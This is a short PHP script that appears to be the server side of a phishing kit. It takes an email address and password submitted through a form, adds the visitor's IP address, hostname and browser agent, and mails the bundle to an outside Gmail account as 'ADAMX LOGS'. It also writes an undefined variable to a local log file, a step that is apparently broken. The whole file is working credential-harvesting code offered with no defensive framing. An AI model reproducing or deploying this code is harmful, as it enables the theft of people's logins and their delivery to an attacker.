<?php
//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];


//Getting UserID info from Session
$username = $_POST['x1'];
$password = $_POST['x2'];



$mesaj="==================+[ User Info  ]+==================
Email: $username
Password   : $password
-------------------+	+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

$fp = fopen('par.txt','a');
$savestring = $jayd."\n";
fwrite($fp, $savestring);
fclose($fp);

	
$subject = "ADAMX  LOGS";
mail('frankstan219@gmail.com', $subject,$mesaj);

?>


